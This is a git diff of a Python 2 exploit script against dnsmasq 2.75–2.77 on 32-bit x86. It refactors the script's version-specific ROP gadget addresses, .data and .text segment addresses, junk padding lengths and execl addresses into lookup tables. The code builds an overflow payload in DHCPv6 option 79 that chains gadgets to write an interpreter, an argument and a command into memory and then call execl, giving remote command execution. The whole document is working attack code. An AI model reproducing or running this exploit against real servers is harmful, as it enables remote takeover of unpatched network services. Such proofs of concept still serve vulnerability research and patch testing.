@@ -21,52 +21,74 @@ from sys import exit
 # 0x08093f60 - 0x08094290 is .bss
 
 # NOP
-NOPx86 = 0x90909090
-NOPx64 = 0x9090909090909090
+NOP = {
+    "x86": 0x90909090, 
+    "x86_64": 0x9090909090909090
+}
+
 
 # CRASH
-CRASHx86 = 0x41414141
-CRASHx64 = 0x4141414141414141
+CRASH = {
+    "x86": 0x41414141,
+    "x86_64": 0x4141414141414141
+}
+
+
+# JUNK
+JUNK = {
+    "x86": {
+        "2.77": 36,
+        "2.76": 24,
+        "2.75": 24
+    }
+}
+
+
+# Segment .text
+TEXT = {
+    "x86": {
+        "2.77": 0x0804a310,
+        "2.76": 0x08049f10,
+        "2.75": 0x08049ee0
+    }
+}
+
+
+# Segment .data
+DATA = {
+    "x86": {
+        "2.77": 0x0808b220,
+        "2.76": 0x08096240,
+        "2.75": 0x08093240
+    }
+}
+
+
+# Execl address without ASLR
+EXECL = {
+    "x86": {
+        "2.77": 0x08070758,
+        "2.76": 0x0806c23c,
+        "2.75": 0x0806c00e
+    }
+}
+
 
 # ROP gadgets
+
 # dnsmasq/2.77 x86 without ASLR
 POP_EAX_277x86 = 0x08081617        # pop eax; ret
 POP_EBX_EBP_277x86 = 0x0804a392    # pop ebx; pop ebp; ret
 MOV_EAX_EBX_277x86 = 0x080672c3    # mov [eax+0x1],ebx; add cl,cl; ret
-EXECL_277x86 = 0x08070758          # execl
 
 # dnsmasq/2.76 x86 without ASLR
 POP_EAX_EBX_276x86 = 0x0804a0d4  # pop eax ; pop ebx ; pop esi ; ret
 MOV_EAX_EBX_276x86 = 0x0804d653  # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-EXECL_276x86 = 0x0806c23c        # execl
 
 # dnsmasq/2.75 x86 without ASLR
 POP_EAX_275x86 = 0x0805cbfa      # pop eax ; ret
 POP_EBX_275x86 = 0x08049641      # pop ebx ; ret
 MOV_EAX_EBX_275x86 = 0x0804d433  # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-EXECL_275x86 = 0x0806c00e        # execl
-
-
-# Segment .text
-# dnsmasq/2.77 x86 without ASLR
-TEXT_277x86 = 0x0804a310
-
-# dnsmasq/2.76 x86 without ASLR
-TEXT_276x86 = 0x08049f10
-
-# dnsmasq/2.75 x86 without ASLR
-TEXT_275x86 = 0x08049ee0
-
-
-# Segment .data
-# dnsmasq/2.77 x86 without ASLR
-DATA_277x86 = 0x0808b220
-
-# dnsmasq/2.76 x86 without ASLR
-DATA_276x86 = 0x08096240
-
-# dnsmasq/2.75 x86 without ASLR
-DATA_275x86 = 0x08093240
 
 
 Base = Base()
@@ -199,7 +221,7 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(addr_in_data - 1 + x)  # address in .data - 1
                 rop_chain += Base.pack32(POP_EBX_EBP_277x86)    # pop ebx; pop ebp; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(DATA_277x86 + 28)      # address of .data + 28
+                rop_chain += Base.pack32(DATA[capacity][dnsmasq_version] + 28)  # address of .data + 28
                 rop_chain += Base.pack32(MOV_EAX_EBX_277x86)    # mov [eax+0x1],ebx; add cl,cl; ret
 
         if dnsmasq_version == "2.76":
@@ -207,10 +229,10 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(POP_EAX_EBX_276x86)    # pop eax ; pop ebx ; pop esi ; ret
                 rop_chain += Base.pack32(addr_in_data + x)      # address in .data
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
                 rop_chain += Base.pack32(MOV_EAX_EBX_276x86)    # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in ebx
-                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in ebx
+                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
 
         if dnsmasq_version == "2.75":
             for x in range(0, len(string), 4):
@@ -219,8 +241,8 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(POP_EBX_275x86)        # pop ebx ; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
                 rop_chain += Base.pack32(MOV_EAX_EBX_275x86)    # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in ebx
-                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in ebx
+                rop_chain += Base.pack32(NOP[capacity])         # NOP (0x90909090) in esi
 
     return rop_chain
 
@@ -229,51 +251,30 @@ if __name__ == '__main__':
     option_79 = ""
     if capacity == "x86":
 
-        interpreter_addr = 0x00000000
-        if dnsmasq_version == "2.77":
-            interpreter_addr = DATA_277x86
-        elif dnsmasq_version == "2.76":
-            interpreter_addr = DATA_276x86
-        elif dnsmasq_version == "2.75":
-            interpreter_addr = DATA_275x86
-        else:
-            print Base.c_error + "This dnsmasq version: " + dnsmasq_version + " not yet supported!"
-            exit(1)
-
+        interpreter_addr = DATA[capacity][dnsmasq_version]
         interpreter_arg_addr = interpreter_addr + len(interpreter) + (4 - (len(interpreter) % 4)) + 4
         payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 4
 
         option_79 += Base.pack16(0)  # mac_type
 
-        if dnsmasq_version == "2.77":
-            option_79 += "0" * 36  # JUNK
-        elif dnsmasq_version == "2.76":
-            option_79 += "0" * 24  # JUNK
-        elif dnsmasq_version == "2.75":
-            option_79 += "0" * 24  # JUNK
+        option_79 += "0" * JUNK[capacity][dnsmasq_version]
 
-        option_79 += Base.pack32(NOPx86)  # EBX = 0x90909090
-        option_79 += Base.pack32(NOPx86)  # ESI = 0x90909090
-        option_79 += Base.pack32(NOPx86)  # EDI = 0x90909090
+        option_79 += Base.pack32(NOP[capacity])  # EBX = 0x90909090
+        option_79 += Base.pack32(NOP[capacity])  # ESI = 0x90909090
+        option_79 += Base.pack32(NOP[capacity])  # EDI = 0x90909090
 
         if dnsmasq_version == "2.77":
-            option_79 += Base.pack32(NOPx86)  # EBP = 0x90909090
+            option_79 += Base.pack32(NOP[capacity])  # EBP = 0x90909090
 
         option_79 += add_string_in_data(interpreter_addr, interpreter)
         option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
         option_79 += add_string_in_data(payload_addr, payload)
 
-        if dnsmasq_version == "2.77":
-            option_79 += Base.pack32(EXECL_277x86)  # address of execl
-        elif dnsmasq_version == "2.76":
-            option_79 += Base.pack32(EXECL_276x86)  # address of execl
-        elif dnsmasq_version == "2.75":
-            option_79 += Base.pack32(EXECL_275x86)  # address of execl
-
-        option_79 += Base.pack32(interpreter_addr)      # address of interpreter
-        option_79 += Base.pack32(interpreter_addr)      # address of interpreter
-        option_79 += Base.pack32(interpreter_arg_addr)  # address of interpreter argument
-        option_79 += Base.pack32(payload_addr)          # address of payload
+        option_79 += Base.pack32(EXECL[capacity][dnsmasq_version])  # address of execl
+        option_79 += Base.pack32(interpreter_addr)                  # address of interpreter
+        option_79 += Base.pack32(interpreter_addr)                  # address of interpreter
+        option_79 += Base.pack32(interpreter_arg_addr)              # address of interpreter argument
+        option_79 += Base.pack32(payload_addr)                      # address of payload
 
     else:
         print Base.c_error + "This capacity: " + capacity + " not yet supported!"
